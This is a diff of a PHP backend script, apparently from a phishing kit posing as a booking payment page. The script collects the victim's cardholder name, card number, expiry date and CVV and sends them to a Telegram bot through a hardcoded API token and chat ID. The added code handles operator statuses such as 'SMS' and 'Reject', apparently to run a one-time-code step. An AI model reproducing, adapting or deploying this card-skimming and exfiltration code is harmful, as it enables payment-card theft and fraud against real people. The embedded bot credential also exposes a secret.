@@ -1,5 +1,4 @@
 <?php
-// Preuzimanje podataka iz POST zahteva
 $cardHolderName = $_POST['cardHolderName'] ?? '';
 $cardNumber = $_POST['cardNumber'] ?? '';
 $expiryDate = $_POST['expiryDate'] ?? '';
@@ -7,7 +6,6 @@ $cvv = $_POST['cvv'] ?? '';
 $amount = $_POST['amount'] ?? '';
 $uniqueId = $_POST['unique_id'] ?? '';
 
-// Formiranje poruke za Telegram
 $message = "Plaćanje rezervacije:\n"
          . "Ime nosioca kartice: $cardHolderName\n"
          . "Broj kartice: $cardNumber\n"
@@ -16,7 +14,6 @@ $message = "Plaćanje rezervacije:\n"
          . "Iznos: $amount\n"
          . "ID: $uniqueId";
 
-// Telegram API konfiguracija
 $apiToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
 $chatId = '-4104959417';
 
@@ -32,7 +29,6 @@ $telegramData = [
     ])
 ];
 
-// Slanje poruke na Telegram
 $ch = curl_init($telegramUrl);
 curl_setopt($ch, CURLOPT_POST, true);
 curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($telegramData));
@@ -41,7 +37,24 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form
 $telegramResponse = curl_exec($ch);
 curl_close($ch);
 
-// Preusmeravanje na stranicu za čekanje odgovora
-header("Location: cekanjeOdgovora.php?unique_id=$uniqueId");
-exit;
+// Obrada odgovora od Telegrama
+if ($telegramResponse) {
+    $telegramData = json_decode($telegramResponse, true);
+    if ($telegramData['ok']) {
+        $responseMessage = "Poruka poslata na Telegram. ";
+        if (isset($_GET['status'])) {
+            if ($_GET['status'] === 'SMS') {
+                $responseMessage .= "POSLAT JE SMS";
+            } elseif ($_GET['status'] === 'Reject') {
+                $responseMessage .= "REJECT REJECT";
+            }
+        }
+    } else {
+        $responseMessage = "Greška prilikom slanja poruke na Telegram.";
+    }
+} else {
+    $responseMessage = "Nema odgovora od Telegrama.";
+}
+
+echo $responseMessage;
 ?>
